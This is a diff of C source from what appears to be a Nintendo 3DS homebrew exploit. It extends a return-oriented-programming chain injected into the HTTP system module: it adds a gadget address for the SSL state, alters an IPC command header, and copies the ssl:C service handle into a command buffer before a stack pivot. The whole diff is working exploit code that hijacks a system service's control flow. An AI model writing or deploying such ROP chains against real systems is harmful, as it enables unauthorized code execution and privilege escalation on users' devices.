@@ -40,6 +40,8 @@ u32 ROP_svcControlMemory = 0x00100770;
 
 u32 ROP_sharedmem_create = 0x001045a4;
 
+u32 ROP_SSLC_STATE = 0x00121674;//State addr used by HTTP-sysmodule for sslc.
+
 void ropgen_addword(u32 **ropchain, u32 *http_ropvaddr, u32 value)
 {
 	u32 *ptr = *ropchain;
@@ -339,8 +341,8 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
 	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xfffffffc);
 	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf-4
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x00030042);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[0] = 0x00030042
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x00030044);
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[0] = 0x00030044
 
 	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
 	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf
@@ -362,6 +364,22 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x8
 	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
 	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[3] = <value written by the above ROP>
+
+	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
+	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0xc);//r0+= 0xc.
+	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0xc
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x10);
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[4] = 0x10
+
+	//Write the ssl:C handle to the below ROP data, so that it gets popped into r0 which then gets written to the cmdbuf.
+	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, ROP_SSLC_STATE + 24, 1);
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, http_newropvaddr + 0x20 + 0x20 + 0x40 + 0x2c + 0x4, 1);
+
+	ropgen_ldrr0r1(&new_ropchain, &http_newropvaddr, closecontext_stackframe, 1);//r0 = saved r4 from the stack, cmdbuf ptr.
+	ropgen_add_r0ip(&new_ropchain, &http_newropvaddr, 0x10);//r0+= 0x10.
+	ropgen_movr1r0(&new_ropchain, &http_newropvaddr);//r1 = cmdbuf+0x10
+	ropgen_setr0(&new_ropchain, &http_newropvaddr, 0x0);
+	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, 0, 0);//cmdbuf[5] = <value written by the above ROP>
 
 	ropgen_stackpivot(&new_ropchain, &http_newropvaddr, ret2http_vaddr);//Pivot to the return-to-http ROP-chain.
 
